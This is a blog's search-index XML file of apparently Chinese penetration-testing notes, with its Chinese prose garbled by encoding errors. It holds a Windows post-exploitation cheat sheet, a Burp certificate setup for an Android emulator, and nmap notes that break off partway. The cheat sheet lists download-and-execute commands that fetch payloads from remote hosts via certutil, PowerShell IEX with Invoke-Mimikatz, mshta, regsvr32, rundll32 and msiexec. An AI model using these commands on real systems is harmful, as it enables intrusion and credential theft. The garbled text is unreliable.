<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[å‚è€ƒæ–‡ç« ]]></title>
    <url>%2F2019%2F09%2F03%2F%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡ç« è®°å½•çœ‹åˆ°çš„æœ‰ä»·å€¼çš„æ–‡ç« ï¼Œå¯ä¾›è‡ªå·±æŸ¥é˜…ä»¥åŠå‚è€ƒã€‚æ„Ÿè°¢ä½œè€…ï¼ï¼ 1ã€å¸¸è§æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“(å°ç»´)ï¼šhttps://xz.aliyun.com/t/6103]]></content>
      <categories>
        <category>å‚è€ƒæ–‡ç« </category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windowsä¸‹å‘½ä»¤æ‰§è¡Œ]]></title>
    <url>%2F2019%2F09%2F02%2Fwindows%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[èƒŒæ™¯ï¼šå¾ˆå¤šRCEæ¼æ´å‡èƒ½æœ‰æ•ˆåœ¨é¶æœºä¸­æ‰§è¡Œå‘½ä»¤ï¼Œä½†å­˜åœ¨æœåŠ¡å™¨å¯å‡ºç½‘ä¸ä¸å¯å‡ºç½‘çš„åŒºåˆ«ã€‚å¯¹windowsæœåŠ¡å™¨è€Œè¨€ï¼Œå¦‚æœèƒ½å‡ºç½‘ã€‚æˆ‘ä»¬åˆ©ç”¨RCEè·å–æœåŠ¡å™¨shellçš„æ–¹å¼éƒ½ç¦»ä¸å¼€ä¸Šä¼ shellcodeåˆ°é¶æœºä¸Š,è€Œå…¶å¯ä½¿ç”¨å§¿åŠ¿æ”¶é›†æ•´ç†å¦‚ä¸‹ï¼š æ–¹å¼certutil123è¯ä¹¦æœåŠ¡çš„ä¸€éƒ¨åˆ†ï¼Œå¯ç”¨æ¥ä¸‹è½½æœ¨é©¬ã€‚certutil -urlcache -split -f http://x.x.x.x/msf a.exe &amp;&amp; a.execertutil.exe -urlcache -split -f http://x.x.x.x/x.jar &amp;&amp;java -jar x.jar powershell12345678910a)ã€powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://x/1.jpgâ€˜,&apos;C:\Users\x\Desktop\test\12.exe&apos;)b)ã€powershell (Invoke-WebRequest http://x/1.jpg -O x.jpg)c)ã€ä¹Ÿå¯ä»¥é€šè¿‡ä»UVCè¯»å–è„šæœ¬æ‰§è¡Œï¼špowershell -exec bypass -f \\webdavserver\a.ps1d)ã€å†…å­˜åŠ è½½ï¼š1ã€powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz2ã€powershell -exec bypass -c &quot;iwr https://gist.githubusercontent.com/Urahara3389/d83b6f9ccedf9aa53f70d987360dbc0e/raw/53ad790f87e0fd2c9449d5359358cd251c39297a/calc.ps1|iex&quot;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;cs shellcode address&apos;))&quot; bitsadmin123bitsadmin å¯ç”¨äºåˆ›å»ºä¸‹è½½æˆ–ä¸Šä¼ å·¥ä½œå’Œç›‘æµ‹å…¶è¿›å±•æƒ…å†µã€‚ä¸æ”¯æŒhttpsã€ftpåè®®ã€‚bitsadmin /TRANSFER /DOWNLOAD http://x.x.x.x/a C:\tmp\1 ä¸‹è½½æ–‡ä»¶åˆ°é¶æœºä¸­bitsadmin /TRANSFER /UPLOAD D:\\1.ps \\å…±äº«ç›®å½•\folder\xx ä¸Šä¼ åˆ°å…±äº«ç›®å½•ï¼ˆæœªæµ‹è¯•ï¼‰ CScript/WScript12345678ä¸¤ç§æ–¹å¼ï¼Œç¬¬ä¸€ç§ç›´æ¥æ‰§è¡ŒUNCè·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼šcscript //E:jscript \\webdavserver\folder\payload.txtç¬¬äºŒç§åˆ†ä¸¤æ­¥å…ˆå†™å…¥è„šæœ¬åè°ƒç”¨ï¼ša)echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; c:\windows\temp\d.vbsb)cscript C:\Windows\Temp\d.vbs http://x.x.x.x/a C:\Windows\Temp\1.exe CSC123456è¯¥æ–¹å¼ä¹Ÿæ˜¯é€šè¿‡å…ˆå†™å…¥å…·æœ‰ä¸‹è½½åŠŸèƒ½çš„cè¯­è¨€ç¨‹åºï¼Œé€šè¿‡cscæ‰“åŒ…æˆexeï¼Œå†é€šè¿‡è¯¥exeä¸‹è½½1ã€echo using System.Net;class WebDL &#123; static void Main(string[] args)&#123;System.Net.WebClient client = new WebClient();client.DownloadFile(args[0],args[1]);&#125;&#125; &gt; c:\windows\temp\svhost.cs2ã€æ‰¾åˆ°cscçš„æ‰€åœ¨ç›®å½•ï¼Œç„¶åè°ƒç”¨ç¼–è¯‘csæ–‡ä»¶ï¼šC:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc /out:c:\windows\temp\svhost.exe C:\Windows\Temp\svhost.cs3ã€ä½¿ç”¨svhost.exeæ‰§è¡Œä¸‹è½½c:\windows\temp\dl.exe http://xx/a.sh c:\windows\temp\a.sh FTP12345å…ˆå°†è¦æ‰§è¡Œçš„å‘½ä»¤å†™å…¥åˆ°ftp.txtï¼Œå†ä½¿ç”¨ftp -s:ftp.txtæ‰§è¡Œæ–‡æœ¬ä¸­çš„å‘½ä»¤ftp.txt:open xx.x.x.x 21GET xxx.exequit JScript1ã€å†™å…¥ä»¥ä¸‹æ–‡ä»¶æ‰§è¡Œå³å¯a.js:123456789101112var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://x/a&quot;,false);Object.send();if (Object.Status == 200)&#123;var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type = 1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\Users\\x\\Desktop\\test\\212.exe&quot;, 2);Stream.Close();&#125; regsvr321234567891011121314151617181920regsvr32 /u /s /i:http://site.com/a.png scrobj.dllè¿œç¨‹åŠ è½½a.png:&lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;ShortJSRAT&quot; classid=&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language=&quot;JScript&quot;&gt; &lt;![CDATA[ ps = &quot;ps script&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; mshta12345678910111213141516171819202122mshtaæ¥å—URLä½œä¸ºä¸€ä¸ªå‚æ•°æ¥æ‰§è¡ŒHTA1ï¼‰ mshta http://xxxx.com/test.htaä½¿ç”¨ mshta \\webdavserver\folder\payload.hta è¿˜å¯éšè—mshta.exeæ‰€ä¸‹è½½çš„å†…å®¹ã€‚Mshtå…·æœ‰æ‰§è¡Œå†…è”è„šæœ¬çš„èƒ½åŠ›ï¼Œå®ƒå°†ä¸‹è½½å¹¶æ‰§è¡Œä¸€ä¸ªè„šæœ¬ä½œä¸ºæœ‰æ•ˆè´Ÿè½½:2ï¼‰ mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://xxxxx.com/payload.sct&quot;&quot;)&quot;))test.hta:&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt;Window.ReSizeTo 0, 0Window.moveTo -2000,-2000Set objShell = CreateObject(&quot;Wscript.Shell&quot;)objShell.Run &quot;xxx.exe&quot;self.close&lt;/script&gt;&lt;body&gt;demo&lt;/body&gt;&lt;/HEAD&gt; &lt;/HTML&gt; rundll32123rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new%20ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://reverse-tcp.xyz/test.exe&quot;,false);Object.send();if(Object.Status==200)&#123;Stream=new%20ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;E:\\test\\ssss2.exe&quot;,2);Stream.Close();&#125;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;% pubprn.vbs123pubprn.vbsæ˜¯windows 7ä»¥åæ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„WSHè„šæœ¬ï¼Œå®ƒä½¿ç”¨äº†GetObject()å¹¶ä¸”å‚æ•°å¯æ§ã€‚cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sctè¯¦æƒ…å¯å‚è€ƒï¼šhttps://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/ å›¾1: winrm.vbs/slmgr.vbs12345678910111213141516171819ä½¿ç”¨è¯¥æ–¹å¼æ‰§è¡Œå‘½ä»¤é¦–å…ˆéœ€è¦ä¸Šä¼ ä¸€ä¸ªxslæ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼šWsmPty.xsl:&lt;?xml version=&apos;1.0&apos;?&gt;&lt;stylesheetxmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;xmlns:user=&quot;placeholder&quot;version=&quot;1.0&quot;&gt;&lt;output method=&quot;text&quot;&gt;&lt;/output&gt; &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt; &lt;![CDATA[ var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;); ]]&gt; &lt;/ms:script&gt;&lt;/stylesheet&gt;åœ¨ä¸Šä¼ xslæ–‡ä»¶ä¹‹åï¼Œä½¿ç”¨ä»¥ä¸‹æ‰¹å¤„ç†æ–‡ä»¶è¿›è¡Œå¯åŠ¨ï¼šmkdir %SystemDrive%\å¯æ§ç›®å½•copy %windir%\System32\cscript.exe %SystemDrive%\BypassDir%SystemDrive%\å¯æ§ç›®å½•\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty msiexecå…ˆé€šè¿‡msfç”Ÿæˆmsiæœ¨é©¬æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨è¯¥å‘½ä»¤åŒ…å«msiæ–‡ä»¶ä¸Šçº¿ã€‚(å…æ€æ˜¯ä¸ªå…³é”®é—®é¢˜)msiexec /q /i http://x/x.pngmsfç”Ÿæˆmsiæ ¼å¼å³å¯ï¼Œå¯é‡å‘½åä¸ºpngmsfvenom -f msi xxx &gt; x,png IEExec1C:\Windows\Microsoft.NET\Framework64\v2.0.50727\IEExec.exe http://xx.x/a.exe Cmdcmd.exe /k &lt; \\webdavserver\1.txt éœ€è¦ä½¿ç”¨UNC/WebDAVæœåŠ¡å™¨ Regasm/RegsvcC:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\1.dll éœ€è¦ä½¿ç”¨UNC/WebDAVæœåŠ¡å™¨ Msbuild1cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\x.xml &gt; x.xml &amp; !MB! x.xml&quot; pcalua.exepcalua.exe -a \\webdavserver\1.dll éœ€è¦ä½¿ç”¨UNC/WebDAVæœåŠ¡å™¨ Cmstpcmstp.exe /ni /s c:\cmstp\CorpVPN.infè¯¥æ–¹å¼æœªå¤ç°ï¼Œå…ˆè®°å½•ä¸€ä¸‹ï¼šhttps://www.anquanke.com/post/id/86685 MavInject3212æŸ¥é˜…èµ„æ–™æ˜¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†æ¶æ„dllæ–‡ä»¶æ³¨å…¥åˆ°æ­£å¸¸è¿›ç¨‹ä¸­æ‰§è¡Œï¼š(æµ‹è¯•æœªå»ºç«‹è¿æ¥2333)C:\Windows\SysWOW64\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt; Odbcconf123ä¸¤ç§åŠ è½½æ¶æ„dllæ–‡ä»¶æ‰§è¡Œçš„æ–¹å¼ï¼Œ/Fåå¯æ‹¼æ¥ä»»æ„åç¼€ã€‚odbcconf.exe /A &#123;REGSVR evil.dll&#125;odbcconf.exe / F odbcconf.configï¼ˆå¯å†™ä¸€ä¸ªä»»æ„åç¼€æ–‡ä»¶ï¼Œé‡Œé¢å†…å®¹åŠ è½½è·å–shellçš„dllã€‚å¦‚æœæ–‡ä»¶æœªåœ¨odbcconf.exeç›®å½•ä¸‹dllæ–‡ä»¶éœ€æœ‰ç»å¯¹è·¯å¾„ã€‚ï¼‰ å…¶ä»–1ã€æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼å¯è·Ÿå…¶ä»–æŠ€æœ¯ç»“åˆï¼Œå› æ­¤æ€»ç»“è¯¥æ–‡åˆæµ®ç°ä¸€ä¸ªå¤§å‘ã€‚å…æ€é—®é¢˜ã€‚æ— è®ºæ˜¯æ‰“ç ´è¾¹ç•Œè·å–å…¥å£ç‚¹æƒé™è¿˜æ˜¯å†…ç½‘æ‹“å±•ã€é’“é±¼æ”»å‡»ç­‰ç­‰æƒ…å†µéƒ½å¯¹å…æ€æœ‰ç»å¯¹ä¾èµ–ã€‚ 2ã€UNC/WebDAVè·¯å¾„åˆ©ç”¨ç›¸å…³æ–‡ç« ï¼šhttps://www.anquanke.com/post/id/86894 3ã€ä¸€ä¸ªJSåŠ è½½.Netç¨‹åºçš„å·¥å…·ï¼šDotNetToJScript https://www.4hou.com/tools/6171.html]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è§£å†³androidæ¨¡æ‹Ÿå™¨æŠ“åŒ…ç¯å¢ƒé—®é¢˜]]></title>
    <url>%2F2019%2F03%2F31%2F%E8%A7%A3%E5%86%B3android%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%8A%93%E5%8C%85%E7%8E%AF%E5%A2%83%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[çº¯å¡«å‘çºªå½•â€“å›æƒ³å®ä¹ é‚£ä¼šè¢«å®‰æ’æµ‹appï¼Œæ²¡ç”¨å¿ƒï¼Œè¿™ä¸‹è¿ä¸ªç¯å¢ƒéƒ½æŠ˜è…¾åŠå¤©ã€‚23333.è®°å½•æ°´æ–‡å¦‚ä¸‹ï¼š1ã€ä¸‹è½½ç½‘æ˜“mumuæ¨¡æ‹Ÿå™¨å¹¶å®‰è£…ã€‚åœ°å€ï¼šhttp://a11.gdl.netease.com/nemu-2.0.23-1101153315.exe 2ã€å°†burpè¯ä¹¦ç”¨opensslå°†DERè½¬æ¢ä¸ºPEMï¼Œç„¶åè¾“å‡ºsubject_hash_oldå€¼å¹¶é‡å‘½åè¯¥æ–‡ä»¶ï¼šå‘½ä»¤å¦‚ä¸‹ï¼š12â–¶ openssl x509 -inform DER -in /Users/sunu11/Downloads/cacert.der -out cacert.pemâ–¶ openssl x509 -inform PEM -subject_hash_old -in cacert.pem|head -1 3ã€ä¸‹è½½adb http://adbshell.com/downloads ï¼Œè¿æ¥æ¨¡æ‹Ÿå™¨ï¼Œå°†è¯ä¹¦ä¼ å…¥ç³»ç»Ÿè¯ä¹¦æ–‡ä»¶å¤¹ä¸‹ï¼š123456789db rootadb remount //é‡æ–°æŒ‚è½½ä¸ºå¯å†™adb push 9a5ba575.0 /sdcard/adb connect 127.0.0.1:7555adb shellcat /sdcard/9a5ba575.0 &gt; /system/etc/security/cacerts/9a5ba575.0 //æ­¤å¤„ç”±äºç½‘æ˜“mumuå…±äº«æ–‡ä»¶å¤¹ä¸­æ–‡ç¼–ç åœ¨cmdä¸­æ˜¾ç¤ºå­˜åœ¨é—®é¢˜ï¼Œæ— æ³•ç›´æ¥mvchmod 644 /system/etc/security/cacerts/9a5ba575.0 //ä¿®æ”¹æƒé™ä¸º644 ç„¶åé‡å¯æ¨¡æ‹Ÿå™¨ï¼Œåœ¨å—ä¿¡ä»»çš„å‡­æ®å¤„å³å¯çœ‹åˆ°burpçš„è¯ä¹¦å·²ç»æ·»åŠ è‡³ç³»ç»Ÿè¯ä¹¦ä¸‹ï¼š 4ã€æŒ‚ä»£ç†ï¼ŒæŠ“åŒ…å³å¯ï¼ŒåŸºæœ¬ä¸Šå¾®ä¿¡å…¬ä¼—å·ï¼Œappã€æµè§ˆå™¨ç­‰æ•°æ®åŒ…éƒ½å¯ç›‘å¬ã€‚ 5ã€æœ€åç•™ä¸ªå‘é¦–å…ˆè´´ä¸€ä¸‹å¾®ä¿¡æŸäº›æ•°æ®åŒ…æ— æ³•æŠ“å–çš„åŸå› ï¼š1234å°ç¨‹åºæ— æ³•æŠ“åŒ…ï¼šå®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸‹ç‰ˆæœ¬ï¼Œä¸ç®¡å¾®ä¿¡ä»»æ„ç‰ˆæœ¬ï¼Œéƒ½ä¼šä¿¡ä»»ç³»ç»Ÿæä¾›çš„è¯ä¹¦å®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡ 7.0 ä»¥ä¸‹ç‰ˆæœ¬ï¼Œå¾®ä¿¡ä¼šä¿¡ä»»ç³»ç»Ÿæä¾›çš„è¯ä¹¦å®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡åªä¿¡ä»»å®ƒè‡ªå·±é…ç½®çš„è¯ä¹¦åˆ—è¡¨ å®‰è£…çš„æ¨¡æ‹Ÿå™¨androidç‰ˆæœ¬ä¸º6.0.1ï¼Œä½†æ˜¯æœ‰ç”±äºç›®å‰æ¨¡æ‹Ÿå™¨æ— æ³•è¿è¡Œå°ç¨‹åºï¼Œæ‰€ä»¥å°ç¨‹åºçš„æ•°æ®åŒ…åªèƒ½ç­‰æˆ‘æŠ˜è…¾å¥½æˆ‘çš„æ¸£æ¸£äºŒæ‰‹ç´¢å°¼æ‰‹æœºå†æ•´äº†ï¼Œä¸è¿‡å°ç¨‹åºä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå€¼å¾—æ·±å…¥æ‘¸ç´¢çš„æ”»å‡»é¢å™¢ 6ã€è¯´åˆ°ç´¢å°¼æ‰‹æœºå°±æœ‰æ°”ï¼ä¹‹å‰ä¸ºäº†æµ‹è¯•ï¼Œé€€äº†ä¸ªäºŒæ‰‹ç´¢å°¼çš„æ‰‹æœºï¼Œéƒ½rootå¥½äº†ï¼Œç¯å¢ƒä¹Ÿokï¼Œå•¥éƒ½èƒ½æï¼Œè°çŸ¥é“å……ç”µç”¨åŠ›è¿‡çŒ›ï¼Œå¼€ä¸äº†æœºï¼Œæ£é¼“äº†ä¸€ä¸ªé€šå®µå„ç§åˆ·æœºrootéƒ½æ²¡æ•´å¥½ï¼Œæ— è¯­ å®¹æˆ‘åæ§½ä¸€ä¸‹2333ã€‚å¦å¤–æœ‰å…¶ä»–å§¿åŠ¿ï¼šxpost+justTrustMeçªç ´sslé™åˆ¶ï¼Œå¯å‚è€ƒæ–‡ç« ï¼šhttps://www.jianshu.com/p/310d930dd62f 7ã€ç»­é›†1ï¼šæ—¶è¿ä¸æµï¼Œå‰å‡ å¤©æ¨¡æ‹Ÿå™¨ç™»å½•å¾®ä¿¡æµ‹è¯•å‘ç°è¢«æ£€æµ‹åˆ°æ¨¡æ‹Ÿå™¨ä¸‹ä½¿ç”¨ï¼Œå› æ­¤å¾®ä¿¡å·ç»™å°äº†23333ï¼Œå¥½åœ¨å¿µåœ¨åˆçŠ¯ï¼Œç”³è¯·ä¸€æ¬¡å°±è¿‡äº†ï¼Œé€¼å¾—æˆ‘æ‰¾å¯¹è±¡è¦äº†ä¸ªäºŒæ‰‹é­…æ—æ‰‹æœºï¼Œç„¶åå€’å…¥burpè¯ä¹¦ï¼ˆderåç¼€æ”¹æˆcerï¼‰å®‰è£…åå°±ä¸ç”µè„‘åœ¨ç»Ÿä¸€wifiä¸‹ï¼Œè®¾ç½®å¥½ä»£ç†å³å¯é¡ºåˆ©æŠ“åŒ…äº†ã€‚è¯¥æ‰‹æœºandroidç‰ˆæœ¬ä¸º5.1ï¼Œå®‰è£…è¯ä¹¦åã€‚å¯ä»¥ç›´æ¥æŠ“å–å…¬ä¼—å·å°ç¨‹åºæ•°æ®åŒ…ã€‚ 8ã€ç»­é›†2:çœ‹åˆ°ç½‘ä¸Šæœ‰ç½‘å‹æå‡ºå¦ä¸€ç§æŠ“åŒ…æ–¹å¼æŠ“å–å¾®ä¿¡PCç«¯çš„æµé‡ï¼Œç±»ä¼¼å†…ç½‘æ¸—é€ä¸­ä»£ç†å†…ç½‘æµé‡ï¼Œåœ¨SocksCap64ä¸­è®¾ç½®ä»£ç†æœåŠ¡å™¨ä¸ºburpçš„åœ°å€å’Œç«¯å£ï¼Œä»£ç†æ–¹å¼HTTP.ç„¶åè®¾ç½®å¾®ä¿¡èµ°socksCap64ä»£ç†ã€‚é€šè¿‡burpsuiteæŠ“åŒ…å³å¯ã€‚]]></content>
      <categories>
        <category>ç»ˆç«¯å®‰å…¨</category>
      </categories>
      <tags>
        <tag>appæ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ¸—é€æµ‹è¯•åˆ©å™¨--nmap]]></title>
    <url>%2F2019%2F03%2F14%2Fnmap%2F</url>
    <content type="text"><![CDATA[ä»‹ç»Nmap Free Security Scanner, Port Scanner, &amp; Network Exploration Tool. Download open source software for Linux, Windows, UNIX, FreeBSD, etc. æœ¬æ–‡ä¸»è¦ç”¨ä»¥æ€»ç»“nmapä½¿ç”¨æŠ€å·§ä¸æ¢æµ‹æ–¹æ³• ä¸»è¦å‚æ•°ä»¥åŠæ‰«ææ–¹å¼ï¼š1 Tcp SYN Scan (sS) è¿™æ˜¯ä¸€ä¸ªåŸºæœ¬çš„æ‰«ææ–¹å¼,å®ƒè¢«ç§°ä¸ºåŠå¼€æ”¾æ‰«æã€‚Nmapå‘é€SYNåŒ…åˆ°è¿œç¨‹ä¸»æœºï¼Œå®ƒä¸ä¼šäº§ç”Ÿä»»ä½•ä¼šè¯.ä¸éœ€è¦é€šè¿‡å®Œæ•´çš„æ¡æ‰‹ï¼Œå°±èƒ½è·å¾—è¿œç¨‹ä¸»æœºçš„ä¿¡æ¯ã€‚å› æ­¤ä¸ä¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šäº§ç”Ÿä»»ä½•æ—¥å¿—è®°å½•ã€‚Nmapå‘½ä»¤ä¸­æ²¡æœ‰æŒ‡å‡ºæ‰«æç±»å‹,é»˜è®¤çš„å°±æ˜¯Tcp SYN.éœ€è¦root/administratoræƒé™.nmap -sS 192.168.1.0/24è¿›è¡Œç§˜å¯†SYNæ‰«æï¼Œå¯¹è±¡ä¸ºä¸»æœºSaznmeæ‰€åœ¨çš„â€œCç±»â€ç½‘æ®µ çš„255å°ä¸»æœºã€‚ 12345678nmap -sS 192.168.1.0/24You requested a scan type which requires root privileges.QUITTING!~ â‰â–¶ sudo nmap -sS 192.168.1.0/24Password:Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-14 20:49 CST 2 Tcp connect() scan(sT)å¦‚æœä¸é€‰æ‹©SYNæ‰«æ,TCP connect()æ‰«æå°±æ˜¯é»˜è®¤çš„æ‰«ææ¨¡å¼.ä¸åŒäºTcp SYNæ‰«æ,Tcp connect()æ‰«æéœ€è¦å®Œæˆä¸‰æ¬¡æ¡æ‰‹,å¹¶ä¸”è¦æ±‚åº•å±‚çš„æ“ä½œç³»ç»Ÿé€šè¿‡å‘å‡ºè¿æ¥ç³»ç»Ÿè°ƒç”¨æ¥å»ºç«‹ä¸ç›®æ ‡æœºå’Œç«¯å£çš„è¿æ¥ã€‚nmap -sT 192.168.1.0/24 3 Udp scan(sU) UDPæ‰«æå‘é€UDPæ•°æ®åŒ…åˆ°ç›®æ ‡ä¸»æœºï¼Œå¹¶ç­‰å¾…å“åº”,å¦‚æœè¿”å›ICMPä¸å¯è¾¾çš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ï¼Œå¦‚æœå¾—åˆ°æ­£ç¡®çš„é€‚å½“çš„å›åº”ï¼Œè¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„.UDPæ‰«æç”¨-sUé€‰é¡¹,UDPæ‰«æå‘é€ç©ºçš„(æ²¡æœ‰æ•°æ®)UDPæŠ¥å¤´åˆ°æ¯ä¸ªç›®æ ‡ç«¯å£:nmap -sU 192.168.1.0/24ä½¿ç”¨UDP pingæ¢æµ‹ä¸»æœºï¼šnmap -PU 192.168.1.0/24 4 FINscan(sF)æœ‰æ—¶å€™TcpSYNæ‰«æä¸æ˜¯æœ€ä½³çš„æ‰«ææ¨¡å¼,å› ä¸ºæœ‰é˜²ç«å¢™çš„å­˜åœ¨.ç›®æ ‡ä¸»æœºæœ‰æ—¶å€™å¯èƒ½æœ‰IDSå’ŒIPSç³»ç»Ÿçš„å­˜åœ¨,é˜²ç«å¢™ä¼šé˜»æ­¢æ‰SYNæ•°æ®åŒ…ã€‚å‘é€ä¸€ä¸ªè®¾ç½®äº†FINæ ‡å¿—çš„æ•°æ®åŒ…å¹¶ä¸éœ€è¦å®ŒæˆTCPçš„æ¡æ‰‹.FINæ‰«æä¹Ÿä¸ä¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šåˆ›å»ºæ—¥å¿— 5 PINGæ‰«æä¸åŒäºå…¶å®ƒçš„æ‰«ææ–¹å¼ï¼Œå› ä¸ºå®ƒåªç”¨äºæ‰¾å‡ºä¸»æœºæ˜¯å¦æ˜¯å­˜åœ¨åœ¨ç½‘ç»œä¸­çš„.å®ƒä¸æ˜¯ç”¨æ¥å‘ç°æ˜¯å¦å¼€æ”¾ç«¯å£çš„.PINGæ‰«æéœ€è¦ROOTæƒé™ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ROOTæƒé™,PINGæ‰«æå°†ä¼šä½¿ç”¨connect()è°ƒç”¨.nmap -Pn 192.168.1.0/24 ï¼ˆä¸è¿›è¡Œpingï¼Œçªç ´é˜²ç«å¢™ï¼‰-PA TCP Ack Ping æ‰«æã€‚-PY åŒ…å«ä¸€ä¸ªæœ€å°çš„INITå—çš„SCTPåŒ… æ‰¾åˆ°ä½¿ç”¨æµæ§åˆ¶ä¼ è¾“åè®®ï¼ˆSCTPï¼‰ä¸»æœºã€‚-PE å°†å¯¹æŒ‡å®šä¸»æœºæ‰§è¡ŒICMPï¼ˆäº’è”ç½‘æ§åˆ¶æ¶ˆæ¯åè®®ï¼‰å›æ˜¾Ping-PP æ‰§è¡Œä¸€æ¬¡ICMPæ—¶é—´æˆ³pingã€‚-PM è¿›è¡ŒICMP åœ°å€æ©ç  ping.-PO æ‰§è¡ŒIPåè®®Pingæ‰«æ-PR é€‰é¡¹æŒ‡ç¤ºçš„Nmapå¯¹æŒ‡å®šç›®æ ‡æ‰§è¡ŒARPï¼ˆåœ°å€è§£æåè®®ï¼‰pingæ“ä½œ-Pn ï½ï½ä¸è¿›è¡Œpingä¸»æœºï½ï½ä¸è¿›è¡Œä¸»æœºå­˜æ´»å‘ç°ï¼ˆps:nmapä½¿ç”¨å››ç§æŠ€æœ¯è¿›è¡Œä¸»æœºå­˜æ´»å‘ç°ï¼ˆicmp echo requestã€TCP SYN ã€TCP ACKã€ICMP timestamp requestâ€”-å¤šè°¢é¦™å›ã€ä¸œåŸå¸ˆçˆ¶ï¼‰-PS TCP SYN Ping æ‰«æ 6 Idlescan(sL)Idlescanæ˜¯ä¸€ç§å…ˆè¿›çš„æ‰«ææŠ€æœ¯ï¼Œå®ƒä¸æ˜¯ç”¨ä½ çœŸå®çš„ä¸»æœºIpå‘é€æ•°æ®åŒ…ï¼Œè€Œæ˜¯ä½¿ç”¨å¦å¤–ä¸€ä¸ªç›®æ ‡ç½‘ç»œçš„ä¸»æœºå‘é€æ•°æ®åŒ…ä»…åˆ—å‡ºæŒ‡å®šç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºï¼Œä¸å‘é€ä»»ä½•æŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœºï¼šnmap -sL 192.168.1.0/24 7 